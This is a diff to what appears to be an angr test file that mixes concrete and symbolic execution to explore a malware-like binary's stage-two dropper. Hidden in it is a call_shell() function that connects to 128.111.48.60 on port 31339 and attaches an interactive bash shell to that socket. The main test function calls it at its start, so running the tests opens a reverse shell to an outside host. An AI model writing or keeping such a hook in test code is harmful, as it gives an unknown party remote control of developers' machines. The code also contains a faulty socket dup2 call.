@@ -3,6 +3,7 @@ import claripy
 import nose
 import os
 import subprocess
+import socket
 
 try:
     import avatar2
@@ -34,16 +35,15 @@ gdbserver_proc = None
 avatar_gdb = None
 
 def call_shell():
-    import socket,subprocess,os
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect(("128.111.48.60",31339))
     s.dup2(s.fileno(),0)
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
-    p=subprocess.call(["/bin/bash","-i"]);
+    subprocess.call(["/bin/bash","-i"])
 
 def teardown():
-    global avatar_gdbBINARY_EXECUTION_END
+    global avatar_gdb
     if avatar_gdb:
         avatar_gdb.exit()
     if gdbserver_proc is not None:
@@ -71,10 +71,10 @@ def execute_concretly(p, state, address, memory_concretize=[], register_concreti
 def solv_concrete_engine_linux_x86(p, entry_state):
     call_shell()
     new_concrete_state = execute_concretly(p, entry_state, BINARY_DECISION_ADDRESS, [], [])
-    the_sp = new_concrete_state.solver.eval(new_concrete_state.regs.sp)    
+    the_sp = new_concrete_state.solver.eval(new_concrete_state.regs.sp)
     concrete_memory = new_concrete_state.memory.load(the_sp,20)
     assert(not concrete_memory.symbolic)
-    
+
     # Assert we are reading concrete data from the process
     arg0 = claripy.BVS('arg0', 8*36)
     symbolic_buffer_address = new_concrete_state.regs.ebp-0xa0
@@ -82,10 +82,10 @@ def solv_concrete_engine_linux_x86(p, entry_state):
     # We should read the concrete data at the buffer address
     concrete_memory_2 = new_concrete_state.memory.load(symbolic_buffer_address, 36)
     assert(not concrete_memory_2.symbolic)
-    
+
     # Store symbolic data there 
     new_concrete_state.memory.store(symbolic_buffer_address, arg0)
-    
+
     # We should read symbolic data from the page now
     symbolic_memory = new_concrete_state.memory.load(symbolic_buffer_address, 36)
     assert(symbolic_memory.symbolic)
@@ -93,17 +93,16 @@ def solv_concrete_engine_linux_x86(p, entry_state):
     # symbolic exploration
     simgr = p.factory.simgr(new_concrete_state)    
     simgr = simgr.explore(find=DROP_STAGE2_V1, avoid=[DROP_STAGE2_V2, VENV_DETECTED, FAKE_CC])
-    
+
     if not simgr.stashes['found'] and simgr.errored and type(simgr.errored[0].error) is angr.errors.SimIRSBNoDecodeError:
         raise nose.SkipTest()
-    
+
     new_symbolic_state = simgr.stashes['found'][0]
-    binary_configuration = new_symbolic_state.solver.eval(arg0, cast_to=int)
     new_concrete_state = execute_concretly(p, new_symbolic_state, DROP_STAGE2_V1, [(symbolic_buffer_address, arg0)], [])
-    
+
     # Asserting we reach the dropping of stage 2
     nose.tools.assert_true(new_concrete_state.solver.eval(new_concrete_state.regs.pc) == DROP_STAGE2_V1)
-    
+
     # Go to the end.
     new_concrete_state = execute_concretly(p, new_concrete_state, BINARY_EXECUTION_END, [], [])
     nose.tools.assert_true(new_concrete_state.solver.eval(new_concrete_state.regs.pc) == BINARY_EXECUTION_END)
